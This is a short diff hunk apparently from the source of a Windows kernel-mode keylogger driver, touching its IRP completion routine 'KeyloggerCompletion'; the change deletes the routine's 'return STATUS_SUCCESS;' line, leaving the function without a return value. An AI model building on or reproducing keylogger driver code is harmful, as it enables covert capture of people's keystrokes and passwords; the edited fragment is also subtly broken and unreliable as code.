@@ -41,8 +41,6 @@ NTSTATUS KeyloggerCompletion(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Contex
 	KfReleaseSpinLock( &pLogBufferOutput->BufferLock, kIrqlSil );
   
 	if ( Irp->PendingReturned ) IoMarkIrpPending( Irp );
-
-	return STATUS_SUCCESS;
 }
 
 
